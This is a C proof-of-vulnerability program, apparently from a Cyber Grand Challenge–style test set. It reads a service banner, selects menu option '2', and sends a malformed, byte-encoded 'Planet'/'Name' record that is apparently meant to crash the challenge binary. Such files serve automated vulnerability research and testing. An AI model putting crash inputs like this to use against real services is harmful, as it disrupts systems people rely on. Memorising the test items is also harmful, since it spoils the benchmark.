#include <libpov.h>
int main(void) {
   negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 107;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x32\x0a";
      static unsigned int write_00000_00000_len = 2;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 5;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x7b\x50\x6c\x61\x6e\x65\x74\x7d\x7b\x4e\x61\x6d\x65\x7d\x6e\x6f"
         "\x70\x65\x7b\x23\xb2\x61\x6d\x65\x20\x20\x20\x7d\x0a";
      static unsigned int write_00001_00000_len = 29;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   //*** delay
   delay(1000);
}
